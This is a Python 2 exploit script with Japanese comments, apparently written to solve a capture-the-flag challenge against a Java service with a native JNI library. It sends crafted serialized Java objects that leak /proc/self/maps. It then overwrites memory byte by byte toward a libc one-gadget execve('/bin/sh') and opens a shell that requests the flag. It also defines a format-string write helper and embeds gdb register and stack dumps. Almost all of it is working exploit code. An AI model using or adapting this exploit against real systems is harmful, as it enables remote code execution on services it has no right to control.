#coding: utf-8
from socket import *
import time


def addr2s(x):
	res = ""
	for i in xrange(size_t):
		res += chr(x % 256)
		x /= 256
	return res

def s2hex(s):
	return map(lambda c: hex(ord(c)),s)
	
def s2addr(s):
	res = 0
	for i in xrange(size_t):
		res *= 256
		res += ord(s[size_t-i-1])
	return res
	
def shell():
	while True:
		print sock.recv(1024)

def getunt(c):
	res = ""
	while res=='' or res[-len(c):]!=c:
		res += sock.recv(1)
		#print res
	#print res
	return res

def send(s):
	#print '[sending :: %s]' % s
	sock.send(s)

def getshellc(fn):
	res = ""
	with open(fn,'rb') as fp:
		res = fp.read()
	print map(ord,res)
	return res


class FSB:
	def check_diff(sl):
		#return ''.join(map(lambda p: '%0x' + chr(p+ord('A')) , xrange(15)))
		return '%8x,' *  15
		#0x25,0x30,0x78,0x2c なので、そのへんを探す。
	def init(sl,kome,bytm,paynum,yet):
		#たとえば、deadbeef,cafebabe,abcd9876,3025cafe, ... なら、
		#fsb.init(kome=3,bytm=2,paynum=,yet=) で。

		sl.kome = kome
		sl.head = '*' * bytm
		#%hnでやっていきます
		sl.yet = yet + paynum * size_t * (size_t / 2) + bytm
		print 'yet .. ',sl.yet
		print yet
		#payloadは、yetとpaynum分ずれて出る。
		sl.data = []
		sl.npn = 0
	def add(sl,addr,val): #addrをvalにする
		
		for i in xrange(size_t/2): #x86なら2,x64なら4
			sl.head += addr2s(addr + i*2)
			sl.data.append((val % 0x10000, '%%%d$hn' % (sl.npn + sl.kome + 2)))
			val /= 0x10000
			sl.npn += 1
		#短い順にソートすることにより、ペイロードを短くする
		
	def get(sl):
		res = sl.head
		ny = sl.yet
		data = sorted(sl.data)
		for ty,s in data:
			dy = ((ty-ny + 0x10000) % 0x10000)
			if dy>0:
				res += '%%%dx' % dy
			res += s
			ny = ty
		#print len(sl.head)
		#print s2hex(sl.head)
		return res

#sudo gdb -q -p `pidof -s execfile` -x gdbcmd
#socat TCP-L:10001,reuseaddr,fork EXEC:./execfile

#./../../tools/rp-lin-x86 --file=mylibc --rop=3 --unique > mygads.txt

isgaibu = False
#isgaibu = True

sock = socket(AF_INET, SOCK_STREAM)
if isgaibu:
	sock.connect(("gaibu.sa-ba-", 10001))
		
else:
	sock.connect(("localhost", 11111))

size_t = 0x8 #x64かx86か。sizeof(void*) の値で。

import base64

one_gad = 0x8f0765
zero_s = 'rO0ABXNyAAdKTklUZXN0QESzY6Wzo+oCAAFKAAdjb250ZXh0eHAAAAAAAAAAAA=='
zero_s = 'rO0ABXNyAAFYP+P+HqNZkQECAAJJAARhcmcxSQAEYXJnMnhwAADerQAAvu8='
zero_s = 'rO0ABXNyAAdKTklUZXN019c+EvlBq0UCAAFKAAdjb250ZXh0eHAAAH/kgBLfgA=='
sub_data_s = base64.b64decode(zero_s)[:-8]

getunt('Send your request:')
sock.send(base64.b64encode(sub_data_s + '\x00' * 8) + '\n')

getprocpay = "rO0ABXNyAAtGaWxlUmVxdWVzdPJ0+KBNda4wAgABTAAIZmlsZW5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cgAJTXlSZXF1ZXN0BrGMWZvz8Q0CAAB4cHQADy9wcm9jL3NlbGYvbWFwcw=="

getunt('Send your request:')
sock.send(getprocpay + '\n')

d = getunt('Send your request:')
print d
ds = d.split('\n')
d = filter(lambda x: '/usr/lib/libJNITest.so' in x,ds)
d = filter(lambda x: 'rw-p' in x,d)[0]
targetp = int(d.split('-')[0],16) + 0x10

d = filter(lambda x: 'libjvm.so' in x,ds)
d = filter(lambda x: 'r-xp' in x,d)[0]
libbase = int(d.split('-')[0],16)


print(hex(targetp),hex(libbase))
#0x7fb0cbafa010:	"untu 7.3.0-27ubuntu1~18.04) 7.3.0" がp

"""
RAX: 0x7f38b7411322 --> 0x480039bb7f058b48 
RBX: 0x7f38a07125b8 --> 0x7f38b6d25298 --> 0x7f38b60cdd20 --> 0x894800000001b855 
RCX: 0x10002a458 --> 0x7f38b6d21bc8 --> 0x7f38b60cdd20 --> 0x894800000001b855 
RDX: 0x7f38927e7010 --> 0x7f38b7411322 --> 0x480039bb7f058b48 
RSI: 0x7f3892eed860 --> 0xfe0c7988 --> 0x4dd8dc309 
RDI: 0x7f38927e7010 --> 0x7f38b7411322 --> 0x480039bb7f058b48 
RBP: 0x7f3892eed820 --> 0x7f3892eed870 --> 0x7f3892eed9d8 --> 0x7f3892eeda60 --> 0x7f3892eedb80 --> 0x7f3892eedc40 (--> ...)
RSP: 0x7f3892eed7e8 --> 0x7f38925e6814 --> 0xe8c78948f0458b48 
RIP: 0x7f38b7411322 --> 0x480039bb7f058b48 
R8 : 0x10002ccc0 --> 0x7f38b6d21bc8 --> 0x7f38b60cdd20 --> 0x894800000001b855 
R9 : 0x0 
R10: 0x7f38a124a541 --> 0x7f38a124a541ba49 
R11: 0x7f38a122d280 --> 0x55fffec000248489 
R12: 0x0 
R13: 0x7f3892eed988 --> 0xfe0baf00 --> 0x11 
R14: 0x7f3892eed860 --> 0xfe0c7988 --> 0x4dd8dc309 
R15: 0x7f38b014c000 --> 0x7f38b6ca5d20 --> 0x7f38b6294f70 --> 0x2e66c35de5894855
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f38b7411315:	mov    rsi,rbp
   0x7f38b7411318:	mov    edi,0x2
   0x7f38b741131d:	call   0x7f38b7401140 <sigprocmask>
=> 0x7f38b7411322:	mov    rax,QWORD PTR [rip+0x39bb7f]        # 0x7f38b77acea8
   0x7f38b7411329:	lea    rdi,[rip+0x164b6a]        # 0x7f38b7575e9a
   0x7f38b7411330:	lea    rsi,[rsp+0x40]
   0x7f38b7411335:	mov    DWORD PTR [rip+0x39e2a1],0x0        # 0x7f38b77af5e0
   0x7f38b741133f:	mov    DWORD PTR [rip+0x39e29b],0x0        # 0x7f38b77af5e4
[------------------------------------stack-------------------------------------]
0000| 0x7f3892eed7e8 --> 0x7f38925e6814 --> 0xe8c78948f0458b48 
0008| 0x7f3892eed7f0 --> 0x0 
0016| 0x7f3892eed7f8 --> 0x7f38927e7010 --> 0x7f38b7411322 --> 0x480039bb7f058b48 
0024| 0x7f3892eed800 --> 0x7f3892eed860 --> 0xfe0c7988 --> 0x4dd8dc309 
0032| 0x7f3892eed808 --> 0x7f38b014c1e0 --> 0x7f38b6d38f40 --> 0x0 
0040| 0x7f3892eed810 --> 0x7f38927e7010 --> 0x7f38b7411322 --> 0x480039bb7f058b48 
0048| 0x7f3892eed818 --> 0x7f3892eed898 --> 0x7f38a122cb7d --> 0x448d48fffffe47e9 
0056| 0x7f3892eed820 --> 0x7f3892eed870 --> 0x7f3892eed9d8 --> 0x7f3892eeda60 --> 0x7f3892eedb80 --> 0x7f3892eedc40 (--> ...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f38b7411322 in ?? () from target:/lib/x86_64-linux-gnu/libc.so.6
gdb-peda$ x/50xw $rsp
0x7f3892eed7e8:	0x925e6814	0x00007f38	0x00000000	0x00000000
0x7f3892eed7f8:	0x927e7010	0x00007f38	0x92eed860	0x00007f38
0x7f3892eed808:	0xb014c1e0	0x00007f38	0x927e7010	0x00007f38
0x7f3892eed818:	0x92eed898	0x00007f38	0x92eed870	0x00007f38
0x7f3892eed828:	0xa124a5b1	0x00007f38	0x92eed8a0	0x00007f38
0x7f3892eed838:	0x00000001	0x00000000	0x00000000	0x00000000
0x7f3892eed848:	0x00000000	0x00000000	0xfe0baed0	0x00000000
0x7f3892eed858:	0xffe08110	0x00000000	0xfe0c7988	0x00000000
0x7f3892eed868:	0x92eed890	0x00007f38	0x92eed9d8	0x00007f38
0x7f3892eed878:	0xa124a06c	0x00007f38	0x0000000f	0x00000000
0x7f3892eed888:	0x92eed910	0x00007f38	0x92eed9d8	0x00007f38
0x7f3892eed898:	0xa122cb7d	0x00007f38	0x00000009	0x00000000
0x7f3892eed8a8:	0xfe08dbf0	0x00000000

"""

"""
0x4f2c5    execve("/bin/sh", rsp+0x40, environ)
constraints:
 rcx == NULL

0x4f322    execve("/bin/sh", rsp+0x40, environ)
constraints:
 [rsp+0x40] == NULL

0x10a38c    execve("/bin/sh", rsp+0x70, environ)
constraints:
 [rsp+0x70] == NULL


RAX: 0x7fe48012df80
"""


def sub_data(p):
	s = base64.b64encode(sub_data_s + addr2s(p-8)[::-1]) + '\n'
	sock.send(s)
	getunt('request:')

ns = "untu 7.3.0-27ubuntu1~18.04) 7.3.0"
ts = addr2s(one_gad + libbase) + '\x00\x00\x00\x00'

"""
gdb-peda$ x/xg $rsp+0x40
0x7f42e87f6828:	0x00007f42e9248a31
gdb-peda$ x/xg $rsp+0x70
0x7f42e87f6858:	0x00000000ffd00018
gdb-peda$ x/xg $rbp-0x40
0x7f42e87f67e0:	0x00007f42f814c000


#0x00007f42e86fa000 0x00007f42e87f8000 rw-p	mapped


0x00007f42e86fa000 0x00007f42e87f8000 rw-p	mapped
0x00007f42e87f8000 0x00007f42e87fb000 ---p	mapped
0x00007f42e87fb000 0x00007f42e88f9000 rw-p	mapped
0x00007f42e88f9000 0x00007f42e88fa000 ---p	mapped
0x00007f42e88fa000 0x00007f42e9000000 rw-p	mapped
0x00007f42e9000000 0x00007f42e9270000 rwxp	mapped

"""

def oidadshi(b=True):
	hd = "rO0ABXNyAApBZGRSZXF1ZXN0goH6Vf5yxLQCAAJJAARhcmcxSQAEYXJnMnhyAAlNeVJlcXVlc3QGsYxZm/PxDQIAAHhwAAAAAQAAAAI="
	hd = base64.b64decode(hd)
	print(hd[:10])
	
	m = 2097152
	#m =  3000000
	#m = 1
	for _ in range(1):
		print m
		d = hd + "@" * m
		d = base64.b64encode(d)
		sock.send(d + '\n')
		if b:
			s = getunt('request:')
			print s
			if 'Invalid' in s:
				break
		else:
			shell()
		m *= 2
	print m

ns = map(ord,ns)
ts = map(ord,ts)
for i in range(len(ts)):
	# p+i+4 の値を ts[i] にする
	d = ns[i]-ts[i]
	if d < 0:
		ns[i+1] -= 1
		d += 256
	
	tp = targetp+i
	print('target ',hex(tp-8))
	for _ in range(d):
		sub_data(tp)
	
	for _ in range(3):
		oidadshi()
	print 'set memdata',i

"""
0x7faefbbfb010:	"untu 7.3.0-27ubuntu1~18.04) 7.3.0"
gdb-peda$ x/30xb 0x7faefbbfb010
0x7faefbbfb010:	0x75	0x6e	0x74	0x75	0x20	0x37	0x2e	0x33
0x7faefbbfb018:	0x2e	0x30	0x2d	0x32	0x37	0x75	0x62	0x75
0x7faefbbfb020:	0x6e	0x74	0x75	0x31	0x7e	0x31	0x38	0x2e
0x7faefbbfb028:	0x30	0x34	0x29	0x20	0x37	0x2e
"""

#"socat tcp-listen:11111,reuseaddr exec:'java -Xms32M -Xmx32M -jar /home/user/App.jar'"





#print 

s = base64.b64encode(sub_data_s + addr2s(targetp)[::-1]) + '\n'
sock.send(s)
getunt('request:')
"""
for _ in range(20000):
	sock.send('id #\n')
	sock.recv(1024)
"""
oidadshi(False)
#sock.send('id #\n')
#print sock.recv(1024)
#print 'end'
sock.send('/send_flag')
sock.send('/send_flag')
sock.send('/send_flag')
time.sleep(1000)
